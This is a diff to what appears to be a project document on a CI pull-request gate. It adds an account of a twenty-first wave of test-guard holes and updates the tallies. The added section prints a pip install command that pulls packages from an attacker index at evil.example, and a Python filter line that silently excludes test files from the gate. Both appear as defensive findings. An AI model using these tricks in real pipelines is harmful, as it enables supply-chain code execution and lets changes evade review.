@@ -465,7 +465,7 @@ A full `--all` run is 14 checks in about 17 seconds, of which `check_branch_scop
 so the gate costs roughly one branch-scope run more than nothing, and a typical docs-only
 selection is a couple of seconds.
 
-Verified by `tests/test_pr_gate.py` (487 checks, hermetic throwaway repos, no network), which
+Verified by `tests/test_pr_gate.py` (503 checks, hermetic throwaway repos, no network), which
 drives the verdict rather than the helpers. Every mutation below is confirmed to fail the
 suite: a prefix trigger loosened to a substring match, a two-dot diff, a runtime failure
 reclassified as advisory, a gating failure that still exits 0, a missing dependency counted
@@ -548,8 +548,8 @@ one-job rule below retired it, and the entry is named rather than deleted becaus
 rule is exactly this: a second job now needs the rule updated, and a reader who finds the old claim
 in a diff should know it was withdrawn deliberately.
 
-The doubled shapes are there because **a hundred and thirty-seven of these guards were vacuous on the first
-attempt**, in twenty waves of 7, 5, 26, 2, 14, 3, 3, 6, 5, 2, 1, 6, 8, 11, 6, 9, 2, 5, 12 and 4 — each wave a narrower version
+The doubled shapes are there because **a hundred and forty-two of these guards were vacuous on the first
+attempt**, in twenty-one waves of 7, 5, 26, 2, 14, 3, 3, 6, 5, 2, 1, 6, 8, 11, 6, 9, 2, 5, 12, 4 and 5 — each wave a narrower version
 of one mistake, and each found *after* the previous wave's fix was reported complete. Not every wave
 gets a paragraph below, and the paragraphs do not follow the tally's order: the numbers count waves,
 the prose keeps the instructive ones, and two of the small waves appear only in the count.
@@ -957,15 +957,67 @@ does now take one (`after=`), and the exemption is confined to terminators the i
 normalises `python3` and the pinned forms beside it are literals beginning `python` — the third instance
 of a helper that knows something a comparison next to it does not.
 
-**Two findings from the wave before were false rejections rather than holes, and they matter as much.**
+**The twenty-first wave is the one to read if you only read one, because its central finding is not a
+missing rule but a rule asking the wrong reader.** Two functions decided whether a pip command was the
+pinned install. `PIP_FORMS` matched whole commands as literal *prefixes*; anything that missed fell
+through to `self_upgrade()`, a classifier written for a different rule, which treats every
+unrecognised `-`-prefixed word as an ignorable option. So:
+
+```
+python -m pip install -U pip -ihttps://evil.example/simple      # 487/487 checks passed
+```
+
+`-U` instead of `--upgrade` breaks the prefix; the glommed `-i` keeps the URL from looking like a bare
+package. Two characters of reordering, and CI installs the gate's dependencies from an
+attacker-controlled index — arbitrary code execution in the job whose purpose is to be trusted. The
+suite already asserted, in seventeen table rows, that `-ihttps://…` is refused. Every one of those rows
+called `pip_tail_ok` **directly**. The authorising path called something else. A table that tests a
+helper in isolation says nothing about the decision the workflow actually gets, and the seventeen rows
+made the surface look thoroughly covered, which is worse than looking uncovered.
+
+The fix is not to harden `self_upgrade` — whoever writes the next classifier will reuse it as an
+authoriser too. One function now decides, on the property rather than on text: the *packages* are
+exactly the pinned payload, and every option is in `PIP_OPTS`. Deciding on the property also deleted a
+false rejection nobody had reported, because options were only ever legal *after* the payload:
+`pip install --quiet ${reqs}` was refused as a foreign command while the trailing spelling passed and
+the table asserted `--quiet` was fine.
+
+The same wave found the limit of pinning text at all. `changed_files()`' argv is pinned whole, because
+the danger is an *added* argument (`-- ":!tests/"`) and no list of forbidden arguments can be complete.
+But a pathspec is not the only way to exclude a tree — a post-filter one line below does it with the
+argv untouched:
+
+```python
+files = [p for p in diffed.split("\0") if p and not p.startswith("tests/")]
+```
+
+Every edit to a suite then selects nothing and the gate passes having chosen to look away, which is the
+exact threat the pin's own comment names, and the pin cannot see it. The rule is now behavioural: one
+file committed in every top-level tree any check triggers on, all of which must survive the round trip.
+Derived from `CHECKS`, because a post-filter can name any tree and a fixture per tree someone thought of
+is the enumeration problem again. Writing that fixture reproduced the wave's own lesson in miniature: the
+first version left the probe files *untracked*, which reaches selection through `git status` rather than
+the diff, so the mutation it was written to kill survived it. A fixture that exercises the wrong half of
+a function is the isolated-table finding again, one hour later.
+
+Two more, both about derived facts that were only half-derived. `_claimed_suites()` carries a docstring
+promising a path stops being claimed the moment no check names it — and then unioned the two spliced
+suite lists in unconditionally, so deleting a whole check left its suites claimed by nobody running
+them while discovery printed "none unclaimed". The accounting lie survived inside its own fix. And a
+`[0]` on a list that used to be a literal and is now derived from `os.path.isdir` aborted the run on an
+`IndexError` if the harness directories ever move — throwing away ~445 checks including, again, the
+invariant whose one job is announcing that a rule stopped running. That is the second time in two waves
+that an eager crash silenced the count invariant.
+
+**Two findings from an earlier wave were false rejections rather than holes, and they matter as much.**
 The argv pins stripped only the glued, fd-less redirection, so `> /dev/null`, `2>/dev/null` and
 `>/dev/null 2>&1` — three correct respellings of a redirection the rule already permits — all failed
 it, the last because the tokenizer read the `&` of `2>&1` as a separator and invented a segment `1`. A
 rule that fires on correct code is how rules get deleted rather than fixed, so the redirection tail is
 now normalised and four spellings are asserted to pass.
 
-Two of the hundred and thirty-seven were caught by the mutation sweep, a hundred and twenty-three by review —
-thirty of those by local passes rather than hosted ones — and twelve by adversarially sweeping a new rule *before*
+Two of the hundred and forty-two were caught by the mutation sweep, a hundred and twenty-eight by review —
+thirty-five of those by local passes rather than hosted ones — and twelve by adversarially sweeping a new rule *before*
 shipping it. The split inside "by review" is the useful
 number: eleven rounds of hosted review preceded a **local** review pass, and the local pass immediately
 found the one live false green in the set. Sweeping your own new rule catches respellings of the hole
@@ -992,7 +1044,7 @@ instead of re-deriving. That claim is true again, by a different mechanism: `JOB
 job's keys, so an `if:` on the job fails wherever it is placed, before or after `steps:`. The
 withdrawal outlived its reason — the same defect one turn further on, and the reason this paragraph
 now names the rule that makes the claim true instead of asserting the claim.
-The corpus is kept for that reason — 147 mutations, 60 loosening probes and 34
+The corpus is kept for that reason — 154 mutations, 68 loosening probes and 37
 correct-edit assertions across five files — but **not in
 this repository**: it lives at `.agents/artifacts/sweeps/`, which `.gitignore` excludes, because this
 project keeps agent working output out of the public tree and because these files mutate the very
